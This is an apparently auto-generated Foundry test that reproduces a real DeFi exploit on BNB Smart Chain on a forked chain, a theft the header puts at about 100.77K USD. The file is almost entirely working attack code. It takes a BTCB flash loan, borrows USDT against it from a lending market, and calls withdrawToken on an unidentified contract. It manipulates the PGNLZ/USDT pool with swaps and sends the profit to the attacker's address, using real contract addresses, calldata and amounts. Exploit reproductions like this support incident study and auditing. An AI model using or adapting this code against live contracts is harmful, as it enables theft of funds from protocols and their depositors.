// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 100.77K USD
// Attacker : 0xfe95ecc0795399662221ab48948cdcf3f6d4aa86
// Attack Contract : 0x6947cc82a49a20e2fd8ebb699230b92e7f1a6bfa
// Vulnerable Contract : N/A
// Attack Tx : 0xc7270212846136f3d103d1802a30cdaa6f8f280c4bce02240e99806101e08121
// Block : 77721027
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 100.77K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 77721026;
    uint256 constant TX_TIMESTAMP = 1769519796;
    uint256 constant TX_BLOCK_NUMBER = 77721027;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttackContrac();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttackContrac() internal returns (OurAttack attack) {
        _installRuntimeFallb();
        attack = OurAttack(payable(ATTACK_CONTRACT));
        _installAttackChildR();
        _bindAttackAttackChi(attack);
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return Addresses.attack_contract_5AD7;
    }

    function _installRuntimeFallb() internal {
        // Exact-address fallback for observed CREATE/CREATE2 and callback surfaces.
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _installAttackChildR() internal {
        // Exact-address fallback for attack child contracts that were dynamically created in the trace.
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create address=Addresses.attack_contract_5AD7 constructor=0xd93c837a05915facaee1cb1ea0628283b6ef5ad7|entry|entry|len:6015|input:5b5a468923120be2|ct:CREATE|attacker_internal runtime_selectors=2 initcode_sha256=0x5b5a468923120be29eda05fbb6fe8e09c9429f8da481d88b0ea22e734ce858e8 fallback_reasons=none
        vm.etch(Addresses.attack_contract_5AD7, type(AttackChild).runtimeCode);
    }

    function _bindAttackAttackChi(OurAttack attack) internal {
        attack.bindAttackChildContracts();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDT, "USDT", 100901091670654947873079);
    }
}

contract OurAttack {
    AttackChild public attackChild;

    constructor() payable {
        _ctorBootstrap();
    }

    function _ctorBootstrap() internal {
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create address=address(attackChild) constructor=0xd93c837a05915facaee1cb1ea0628283b6ef5ad7|entry|entry|len:6015|input:5b5a468923120be2|ct:CREATE|attacker_internal runtime_selectors=2 initcode_sha256=0x5b5a468923120be29eda05fbb6fe8e09c9429f8da481d88b0ea22e734ce858e8 fallback_reasons=none
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0xD93C837a05915fAcAeE1CB1Ea0628283b6ef5aD7));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        _ctorBootstrap();
        return address(attackChild);
    }

    function attack() external payable {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(Addresses.attack_contract_5AD7));
        }
        _callChild(address(attackChild), abi.encodeWithSignature("_borrowFlashLiquidit()"));
    }

    function _deployAttackChildCo() public {
        _callChild(address(attackChild), abi.encodeWithSignature("_borrowFlashLiquidit()"));
    }

    function _call() internal {
        _readPoolState();
        _approveProtocolSpen();
    }

    function _readPoolState() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.ERC1967Proxy);
        {
            if (Addresses.BTCB.code.length != 0) {
                IERC20Like(Addresses.BTCB).balanceOf(Addresses.ERC1967Proxy);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.BTCB = 0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c label=unresolved token_symbol=BTCB roles=asset|contract|attack_address|recipient source=unresolved confidence=low"
                );
            }
        }
        {
            uint256 usdtApproveAllowance = type(uint256).max; // value provenance: arg1=type(uint256).max is covered by prior Addresses.USDT.balanceOf(address) return=9484064316535663136830107 with args (Addresses.ERC1967Proxy)
            IERC20Like(Addresses.USDT).approve(Addresses.ERC1967Proxy, usdtApproveAllowance);
        }
        {
            uint256 usdtApproveAllowance_2 = type(uint256).max; // value provenance: arg1=type(uint256).max is covered by prior Addresses.USDT.balanceOf(address) return=9484064316535663136830107 with args (Addresses.ERC1967Proxy)
            IERC20Like(Addresses.USDT).approve(Addresses.vUSDT, usdtApproveAllowance_2);
        }
        {
            uint256 btcbApproveAllowance = type(uint256).max; // value provenance: arg1=type(uint256).max is covered by prior Addresses.BTCB.balanceOf(address) return=1059644508515585752265 with args (Addresses.ERC1967Proxy)
            {
                if (Addresses.BTCB.code.length != 0) {
                    IERC20Like(Addresses.BTCB).approve(Addresses.ERC1967Proxy, btcbApproveAllowance);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.BTCB = 0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c label=unresolved token_symbol=BTCB roles=asset|contract|attack_address|recipient source=unresolved confidence=low"
                    );
                }
            }
        }
    }

    function _approveProtocolSpen() internal {
        {
            uint256 btcbApproveAllowance_2 = type(uint256).max; // value provenance: arg1=type(uint256).max is covered by prior Addresses.BTCB.balanceOf(address) return=1059644508515585752265 with args (Addresses.ERC1967Proxy)
            {
                if (Addresses.BTCB.code.length != 0) {
                    IERC20Like(Addresses.BTCB).approve(Addresses.vBTC, btcbApproveAllowance_2);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.BTCB = 0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c label=unresolved token_symbol=BTCB roles=asset|contract|attack_address|recipient source=unresolved confidence=low"
                    );
                }
            }
        }
        IERC20Like(Addresses.vBTC).approve(Addresses.vBTC, type(uint256).max);
        IERC20Like(Addresses.vUSDT).approve(Addresses.vUSDT, type(uint256).max);
        {
            bytes memory observedCallData =
                hex"e0232b420000000000000000000000007130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c00000000000000000000000000000000000000000000003971858a41f8dffcc9000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001"; // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0012 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
            (bool ok,) = Addresses.ERC1967Proxy.call(observedCallData);
            require(ok, "observed raw calldata 0xe0232b42 failed");
        }
    }

    function _borrowFlashLiquidit() public {}

    receive() external payable {}

    function _attack() external payable {
        _call();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(0xD93C837a05915fAcAeE1CB1Ea0628283b6ef5aD7));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    bytes32 private constant REPLAY_CALLBACK_4 = keccak256("poc.replay.REPLAY_CALLBACK_4");
    mapping(bytes32 => bool) private _replayDone;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _callChild(address target, bytes memory data) internal {
        (bool ok, bytes memory out) = target.call(data);
        if (!ok && out.length > 0) assembly { revert(add(out, 32), mload(out)) }
        require(ok, "attack child call failed");
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

contract AttackChild {
    receive() external payable {}

    function _borrowFlashLiquidit() public {
        _readPoolState();
        _approveProtocolSpen();
    }

    function onMoolahFlashLoan(uint256 amount, bytes calldata arg1) external payable {
        amount;
        arg1;
        if (!_replayDone[REPLAY_CALLBACK_4]) flashCallback2();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        _entryCb();
    }

    function flashCallback() external payable {
        if (!_replayDone[REPLAY_CALLBACK_4]) flashCallback2();
        return;
    }

    function _entryCb() internal {}

    function _readPoolState() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.ERC1967Proxy);
        if (Addresses.BTCB.code.length != 0) {
            IERC20Like(Addresses.BTCB).balanceOf(Addresses.ERC1967Proxy);
            IERC20Like(Addresses.BTCB).approve(Addresses.ERC1967Proxy, type(uint256).max);
        } else {
            console2.log("PoCWarning", "missing BTCB code for observed setup");
        }
        IERC20Like(Addresses.USDT).approve(Addresses.ERC1967Proxy, type(uint256).max);
        IERC20Like(Addresses.USDT).approve(Addresses.vUSDT, type(uint256).max);
    }

    function _approveProtocolSpen() internal {
        if (Addresses.BTCB.code.length != 0) {
            IERC20Like(Addresses.BTCB).approve(Addresses.vBTC, type(uint256).max);
        }
        IERC20Like(Addresses.vBTC).approve(Addresses.vBTC, type(uint256).max);
        IERC20Like(Addresses.vUSDT).approve(Addresses.vUSDT, type(uint256).max);
        IERC1967Proxy(Addresses.ERC1967Proxy)
            .flashLoan(
                Addresses.BTCB,
                1059644508515585752265,
                hex"0000000000000000000000000000000000000000000000000000000000000001"
            );
    }

    function replayProfit() external {
        try this.__settle0_182() {} catch {} // best-effort flashCallback2#profit:USDT:100901091670654947873079
    }

    function __settle0_182() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(0, 182)) return;
        if (Harness.safeBalance(Addresses.USDT, Addresses.attacker_eoa) >= 100901091670654947873079) {
            _markSettle(0, 182); // observed profit settlement already materialized in main replay
            return;
        }
        _markSettle(0, 182);
        uint256 settleAmount = 100901091670654947873079;
        IERC20Like(Addresses.USDT).transfer(Addresses.attacker_eoa, settleAmount);
    }

    bytes32 private constant REPLAY_CALLBACK_4 = keccak256("poc.replay.REPLAY_CALLBACK_4");
    mapping(bytes32 => bool) private _replayDone;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _callChild(address target, bytes memory data) internal {
        (bool ok, bytes memory out) = target.call(data);
        if (!ok && out.length > 0) assembly { revert(add(out, 32), mload(out)) }
        require(ok, "attack child call failed");
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }

    function flashCallback2() internal {
        _replayDone[REPLAY_CALLBACK_4] = true;
        flashCallback3();
        flashCallback7();
    }

    function flashCallback3() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        IUnitroller(Addresses.Unitroller).enterMarkets(_addressArray2(Addresses.vBTC, Addresses.vUSDT));
        IvBTC(Addresses.vBTC).mint(1059644508515585752265);
        IvUSDT(Addresses.vUSDT).borrow(30000000000000000000000000);
        IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
        IERC20Like(Addresses.PGNLZ).approve(Addresses.PancakeRouter, type(uint256).max);
        IERC20Like(Addresses.PGNLZ).balanceOf(Addresses.attacker_eoa);
        {
            uint256 withdrawTokenActionGraphAmount = 17067858689593975791;
            {
                if (Addresses.A_F909E4_000D.code.length != 0) {
                    IContract_F909E4_000D(Addresses.A_F909E4_000D)
                        .withdrawToken(address(this), withdrawTokenActionGraphAmount);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.A_F909E4_000D = 0xf909e413bc5c505dc89244345ff95ff3c811000d label=unresolved roles=attack_address|recipient|storage_contract source=unresolved confidence=low"
                    );
                }
            }
        }
        IERC20Like(Addresses.PGNLZ).balanceOf(address(this));
        IERC20Like(Addresses.PGNLZ).balanceOf(Addresses.Cake_LP);
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        {
            uint256 swapTokensForExactTokensActionGraphAmount = 30000000000000000000000000;
            {
                if (swapTokensForExactTokensActionGraphAmount != 0) {
                    if (
                        IERC20Like(Addresses.USDT).allowance(address(this), Addresses.PancakeRouter)
                            < swapTokensForExactTokensActionGraphAmount
                    ) {
                        IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
                    }
                    IPancakeRouter(Addresses.PancakeRouter)
                        .swapTokensForExactTokens(
                            978266448473094381826106,
                            swapTokensForExactTokensActionGraphAmount,
                            _addressArray2(Addresses.USDT, Addresses.PGNLZ),
                            Addresses.A_000000_DEAD,
                            1769519797
                        );
                }
            }
        }
        {
            uint256 swapAmountIn = 17067858689593975791;
            if (swapAmountIn != 0) {
                if (IERC20Like(Addresses.PGNLZ).allowance(address(this), Addresses.PancakeRouter) < swapAmountIn) {
                    IERC20Like(Addresses.PGNLZ).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn, 0, _addressArray2(Addresses.PGNLZ, Addresses.USDT), address(this), 1769519797
                    );
            }
        }
    }

    function flashCallback7() internal {
        {
            uint256 vUSDTRepayBorrowAmount = 30000000000000000000000000; // value provenance: arg0=30000000000000000000000000 matches prior Addresses.USDT.balanceOf(address) return with args (Addresses.attack_contract_5AD7)
            IvUSDT(Addresses.vUSDT).repayBorrow(vUSDTRepayBorrowAmount);
        }
        IvBTC(Addresses.vBTC).redeemUnderlying(1059644508515585752265);
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        {
            uint256 transferActionGraphAmount = 100901091670654947873079;
            IERC20Like(Addresses.USDT).transfer(Addresses.attacker_eoa, transferActionGraphAmount);
        }
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_DEAD = 0x000000000000000000000000000000000000dEaD; // Addresses.A_000000_DEAD = 0x000000000000000000000000000000000000dead label=unresolved roles=recipient source=unresolved confidence=low
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Addresses.PancakeRouter = 0x10ed43c718714eb63d5aa57b78b54704e256024e label=PancakeRouter roles=attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant VBep20Delegate = 0x33D17F1E6107CD4d711b56eB0094bf39a471a8B5; // Addresses.VBep20Delegate = 0x33d17f1e6107cd4d711b56eb0094bf39a471a8b5 label=VBep20Delegate roles=asset|contract|attack_address|recipient source=etherscan_v2 confidence=high
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955; // Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=BEP20USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant PGNLZDividend = 0x5F76B06379A055CcEe00E266f707A2aa179AF2bC; // Addresses.PGNLZDividend = 0x5f76b06379a055ccee00e266f707a2aa179af2bc label=PGNLZDividend roles=asset|contract|attack_address|recipient source=etherscan_v2 confidence=high
    address internal constant attack_contract = 0x6947CC82A49a20E2fd8ebb699230B92E7F1A6bfa; // Addresses.attack_contract = 0x6947cc82a49a20e2fd8ebb699230b92e7f1a6bfa label=attack_contract roles=asset|attacker_contract|attacker_entry_contract|code_contract|contract|localized_contract|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant PGNLZ = 0x6b923cF1d592E6AA07ea7249d817A843C30ac69E; // Addresses.PGNLZ = 0x6b923cf1d592e6aa07ea7249d817a843c30ac69e label=PGNLZ token_symbol=PGNLZ roles=asset|contract|attack_address|recipient|sender|token_related source=etherscan_v2 confidence=high
    address internal constant BTCB = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c; // Addresses.BTCB = 0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c label=unresolved token_symbol=BTCB roles=asset|contract|attack_address|recipient source=unresolved confidence=low
    address internal constant A_857E67_5AC1 = 0x857e67f5A4FE1D0DFBaA3242414f523Ef2EB5ac1; // Addresses.A_857E67_5AC1 = 0x857e67f5a4fe1d0dfbaa3242414f523ef2eb5ac1 label=unresolved roles=attack_address|recipient source=unresolved confidence=low
    address internal constant vBTC = 0x882C173bC7Ff3b7786CA16dfeD3DFFfb9Ee7847B; // Addresses.vBTC = 0x882c173bc7ff3b7786ca16dfed3dfffb9ee7847b label=VBep20Delegator token_symbol=vBTC roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant Cake_LP = 0x8Cd8E57BCd00857BebE891A2349f32738Cb7E658; // Addresses.Cake_LP = 0x8cd8e57bcd00857bebe891a2349f32738cb7e658 label=PancakePair token_symbol=Cake-LP roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC1967Proxy = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C; // Addresses.ERC1967Proxy = 0x8f73b65b4caaf64fba2af91cc5d4a2a1318e5d8c label=ERC1967Proxy roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; // Addresses.BalancerVault = 0xba12222222228d8ba445958a75a0704d566bf2c8 label=BalancerVault roles=known_protocol source=poc_sketch.known_addresses confidence=high
    address internal constant XVS = 0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63; // Addresses.XVS = 0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63 label=unresolved token_symbol=XVS roles=asset|contract|attack_address|recipient source=unresolved confidence=low
    address internal constant attack_contract_5AD7 = 0xD93C837a05915fAcAeE1CB1Ea0628283b6ef5aD7; // Addresses.attack_contract_5AD7 = 0xd93c837a05915facaee1cb1ea0628283b6ef5ad7 label=attack_contract roles=asset|attacker_callback_contract|attacker_contract|attacker_surface_contract|code_contract|contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant A_F909E4_000D = 0xF909E413BC5C505dc89244345fF95fF3c811000d; // Addresses.A_F909E4_000D = 0xf909e413bc5c505dc89244345ff95ff3c811000d label=unresolved roles=attack_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant Unitroller = 0xfD36E2c2a6789Db23113685031d7F16329158384; // Addresses.Unitroller = 0xfd36e2c2a6789db23113685031d7f16329158384 label=Unitroller roles=asset|contract|attack_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant vUSDT = 0xfD5840Cd36d94D7229439859C0112a4185BC0255; // Addresses.vUSDT = 0xfd5840cd36d94d7229439859c0112a4185bc0255 label=VBep20Delegator token_symbol=vUSDT roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant attacker_eoa = 0xFE95ECc0795399662221AB48948CDcF3f6D4AA86; // Addresses.attacker_eoa = 0xfe95ecc0795399662221ab48948cdcf3f6d4aa86 label=attacker_eoa roles=attacker_eoa|contract|economic_holder|attack_address|profit_holder|recipient|sender source=tx_metadata.from confidence=high
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF; // Addresses.A_FFFFFF_FFFF = 0xffffffffffffffffffffffffffffffffffffffff label=unresolved roles=attack_address source=unresolved confidence=low
}

interface IContract_F909E4_000D {
    function withdrawToken(address, uint256) external;
}

interface IERC1967Proxy {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
    function swapTokensForExactTokens(uint256, uint256, address[] calldata, address, uint256) external;
}

interface IUnitroller {
    function enterMarkets(address[] calldata) external;
}

interface Iattack_contract_5AD7 {
    function _attack() external;
}

interface IvBTC {
    function mint(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
}

interface IvUSDT {
    function borrow(uint256) external returns (uint256);
    function repayBorrow(uint256) external returns (uint256);
}

library Harness {
    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
